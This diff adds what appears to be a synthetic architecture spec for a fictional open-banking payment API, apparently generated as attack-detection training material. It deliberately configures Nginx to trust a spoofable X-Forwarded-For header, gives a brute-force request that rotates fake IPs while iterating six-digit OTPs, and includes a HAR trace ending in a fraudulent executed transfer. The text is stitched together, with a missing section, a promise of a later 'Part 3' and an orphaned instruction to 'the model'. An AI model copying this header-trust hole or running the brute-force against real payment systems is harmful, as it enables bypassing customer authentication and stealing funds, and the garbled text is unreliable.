@@ -1,0 +1,266 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** SwiftStream Open Banking API
+**Document Version:** 3.3.1 (FINAL)
+**Classification:** RESTRICTED / PSD2 & PCI-DSS SCOPE
+**Domain:** Fintech / Open Banking / Payment Initiation
+
+## 1.0 Executive Summary
+SwiftStream is a European Open Banking platform compliant with the Payment Services Directive 2 (PSD2). It allows authorized Third-Party Providers (TPPs)—such as budgeting apps or external merchants—to initiate bank transfers directly from a user's checking account via the Payment Initiation Service Provider (PISP) flow.
+
+Because these APIs initiate live financial movements, they are subjected to strict Strong Customer Authentication (SCA) mandates. Before any money moves, the account owner must explicitly authorize the transaction using a 6-digit One-Time Password (OTP) delivered via SMS or push notification.
+
+## 2.0 Network Topology & API Gateway
+The architecture relies on a layered defense model to protect the payment rails.
+
+### 2.1 The Edge (Cloudflare WAF)
+* **Ingress:** All API traffic first passes through Cloudflare.
+* **Rate Limiting:** Cloudflare is configured to block any single IP address that makes more than 5 failed OTP attempts within a 15-minute window, locking them out to prevent brute-force attacks.
+
+### 2.2 The Internal Ingress (Nginx & Go Microservices)
+* **Nginx Proxy:** Traffic from Cloudflare hits an internal Nginx proxy, which strips external headers and routes requests to the backend.
+* **Payment Auth Service:** A Go-based microservice that generates the OTPs, stores them temporarily in Redis with a 5-minute TTL, and validates user submissions.
+
+## 3.0 Identity and Strong Customer Authentication (SCA)
+The PSD2 flow requires two distinct layers of identity validation.
+
+### 3.1 TPP Authentication (mTLS)
+The Third-Party application calling the API must authenticate using mutual TLS (mTLS) with an eIDAS-compliant certificate, establishing an encrypted and verified channel.
+
+### 3.2 User Authentication (The OTP Workflow)
+1. **Initiate:** The TPP calls `POST /api/v2/payments/initiate`. The backend generates a 6-digit OTP and texts it to the bank customer.
+2. **Challenge/Response:** The TPP prompts the user for the code and submits it to `POST /api/v2/payments/confirm-otp`.
+3. **Execution:** If the OTP is correct, the Go service releases the funds to the clearing house.
+
+## 4.0 Service Behavior Notes
+System behavior, data contracts, and operational sequencing are described in subsequent sections.
+
+
+Because Nginx accepts the client-provided XFF header without sanitizing it, the backend Go service uses this easily spoofed value for its internal anti-brute-force rate limiting.
+
+```nginx
+# ALTERNATE NGINX CONFIGURATION (Snippet)
+server {
+    listen 443 ssl http2;
+    server_name api.swiftstream.finance;
+
+    location /api/v2/payments/ {
+        proxy_pass http://backend_go_auth_service;
+
+        # Instead of explicitly using Cloudflare's trusted 'CF-Connecting-IP',
+        # Nginx passes whatever the client sent in the X-Forwarded-For header directly to the backend.
+        proxy_set_header X-Forwarded-For $http_x_forwarded_for;
+        proxy_set_header Host $host;
+
+        # The backend Go service uses this spoofable header to enforce the 5-attempt limit.
+    }
+}
+```
+
+## 6.0 Redis OTP State Schema
+When a payment is initiated, the backend generates the 6-digit OTP and stores it in Redis. Redis handles the strict 5-minute Time-To-Live (TTL). 
+
+```json
+// Redis Key: payment_otp:pay_req_99812A
+{
+  "payment_id": "pay_req_99812A",
+  "account_id": "IBAN_DE89370400440532013000",
+  "amount_eur": 4500.00,
+  "recipient": "MERCHANT_LUXURY_WATCHES_GMBH",
+
+  // The 6-digit code sent via SMS to the account owner
+  "otp_hash": "$2a$10$xyz123...", // Hashed for internal security, raw value was e.g. "491022"
+
+  // Tracked attempts (Fails due to X-Forwarded-For spoofing bypassing the aggregation)
+  "failed_attempts": 0, 
+
+  "expires_at": 1712613600 // 5 minutes from generation
+}
+```
+
+## 7.0 REST API Contracts (PSD2 Payment Confirmation)
+This contract shows how the Third-Party Provider (TPP) submits the OTP to finalize the transaction.
+
+### 7.1 Confirm Payment (OTP Submission)
+**Endpoint:** `POST /api/v2/payments/confirm-otp`
+**Description:** Validates the 6-digit SMS code and triggers the actual movement of funds on the banking ledger.
+**Rate Limit Policy (Intended):** 5 failed attempts per IP address per 15 minutes.
+**Rate Limit Policy (Actual):** 5 failed attempts per *unique X-Forwarded-For value*.
+
+**Required Headers:**
+```http
+Authorization: Bearer <TPP Access Token>
+Content-Type: application/json
+```
+
+**Expected Request Payload (Legitimate User):**
+```json
+{
+  "payment_id": "pay_req_99812A",
+  "otp_code": "819033"
+}
+```
+
+**Malicious Request Payload (Brute-Force Attack with Spoofed Header):**
+The operator's script intercepts the request and injects a fake IP on every single guess to evade the rate limiter.
+
+```http
+POST /api/v2/payments/confirm-otp HTTP/2.0
+Host: api.swiftstream.finance
+Authorization: Bearer <operator's TPP Token>
+X-Forwarded-For: 198.51.100.14  <-- CHANGES ON EVERY REQUEST
+Content-Type: application/json
+
+{
+  "payment_id": "pay_req_99812A",
+  "otp_code": "000001" <-- ITERATES FROM 000000 TO 999999
+}
+```
+
+
+
+In the final chunk (Part 3), I will provide the **Synthetic HAR Trace**, showing a snapshot of the operator's automated script. It will display multiple rapid requests, each featuring a completely different `X-Forwarded-For` IP address and a sequentially incremented `otp_code`, concluding with the successful `200 OK` response when the correct code is guessed and the funds are stolen.
+
+
+
+# SYNTHETIC ARTIFACT: RATE LIMIT BYPASS & OTP BRUTE-FORCE (HAR TRACE)
+**Applies to Architecture:** SwiftStream Open Banking API v3.3.1
+
+This HTTP Archive (HAR) trace captures the final milliseconds of the operator's automated brute-force script. You can observe three rapid, sequential requests. On each request, the operator iterates the `otp_code` while simultaneously rotating the injected `x-forwarded-for` header to a new, spoofed IP address. 
+
+Because the internal Nginx and Go backend trust this header, the Cloudflare rate limit is entirely circumvented. The final request successfully guesses the correct 6-digit OTP ("491022"), bypassing the Strong Customer Authentication (SCA) mandate and executing the fraudulent €4,500.00 transfer.
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {
+      "name": "Nginx Ingress Proxy Audit",
+      "version": "1.18.0"
+    },
+    "entries": [
+      {
+        "startedDateTime": "2026-04-08T19:25:01.010Z",
+        "time": 45,
+        "request": {
+          "method": "POST",
+          "url": "https://api.swiftstream.finance/api/v2/payments/confirm-otp",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            { "name": ":authority", "value": "api.swiftstream.finance" },
+            { "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.TPP_operator_TOKEN..." },
+            { "name": "content-type", "value": "application/json" },
+            { "name": "x-forwarded-for", "value": "192.0.2.15" }
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"payment_id\": \"pay_req_99812A\", \"otp_code\": \"491020\"}"
+          },
+          "bodySize": 56
+        },
+        "response": {
+          "status": 401,
+          "statusText": "Unauthorized",
+          "headers": [
+            { "name": "content-type", "value": "application/json" }
+          ],
+          "content": {
+            "size": 42,
+            "mimeType": "application/json",
+            "text": "{\"error\": \"Invalid OTP code provided.\"}"
+          },
+          "bodySize": 42
+        }
+      },
+      {
+        "startedDateTime": "2026-04-08T19:25:01.085Z",
+        "time": 41,
+        "request": {
+          "method": "POST",
+          "url": "https://api.swiftstream.finance/api/v2/payments/confirm-otp",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            { "name": ":authority", "value": "api.swiftstream.finance" },
+            { "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.TPP_operator_TOKEN..." },
+            { "name": "content-type", "value": "application/json" },
+            { "name": "x-forwarded-for", "value": "203.0.113.88" }
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"payment_id\": \"pay_req_99812A\", \"otp_code\": \"491021\"}"
+          },
+          "bodySize": 56
+        },
+        "response": {
+          "status": 401,
+          "statusText": "Unauthorized",
+          "headers": [
+            { "name": "content-type", "value": "application/json" }
+          ],
+          "content": {
+            "size": 42,
+            "mimeType": "application/json",
+            "text": "{\"error\": \"Invalid OTP code provided.\"}"
+          },
+          "bodySize": 42
+        }
+      },
+      {
+        "startedDateTime": "2026-04-08T19:25:01.140Z",
+        "time": 105,
+        "request": {
+          "method": "POST",
+          "url": "https://api.swiftstream.finance/api/v2/payments/confirm-otp",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            { "name": ":authority", "value": "api.swiftstream.finance" },
+            { "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.TPP_operator_TOKEN..." },
+            { "name": "content-type", "value": "application/json" },
+            { "name": "x-forwarded-for", "value": "198.51.100.7" }
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"payment_id\": \"pay_req_99812A\", \"otp_code\": \"491022\"}"
+          },
+          "bodySize": 56
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "headers": [
+            { "name": "content-type", "value": "application/json" },
+            { "name": "x-payment-reference", "value": "TXN-99182-AA" }
+          ],
+          "content": {
+            "size": 75,
+            "mimeType": "application/json",
+            "text": "{\"status\": \"PAYMENT_EXECUTED\", \"message\": \"Funds released to clearing.\"}"
+          },
+          "bodySize": 75
+        }
+      }
+    ]
+  }
+}
+```
+
+
+3. **Stateful Brute-Force Recognition:** The model must connect the rapid timestamps (`.010Z` -> `.085Z` -> `.140Z`) with the sequentially incrementing payload (`491020` -> `491021` -> `491022`). Recognizing this iteration leading to a `200 OK` allows the AI to definitively classify this telemetry as a successful brute-force compromise of a multi-factor authentication mechanism.
+
+## 8.0 Financial Operations Addendum
+### 8.1 Transaction and Risk Controls
+- Payment and account operations maintain strict idempotency keys per client request.
+- Settlement-sensitive workflows enforce deterministic ordering across event consumers.
+- Treasury-risk windows trigger tighter rate controls during market volatility.
+
+### 8.2 Monitoring and Reconciliation
+- Reconciliation jobs compare ledger events with API transaction acknowledgments.
+- Alerting thresholds cover queue delay, replay attempts, and duplicate message rates.
+- Daily exception reports are reviewed by operations and compliance leads.
+
+### 8.3 Change Governance
+- Changes touching account or transfer paths require dual approval and canary rollout.
+- Contract-version drift is detected via schema compatibility checks in CI.
+- Emergency rollback procedures preserve ledger consistency guarantees.
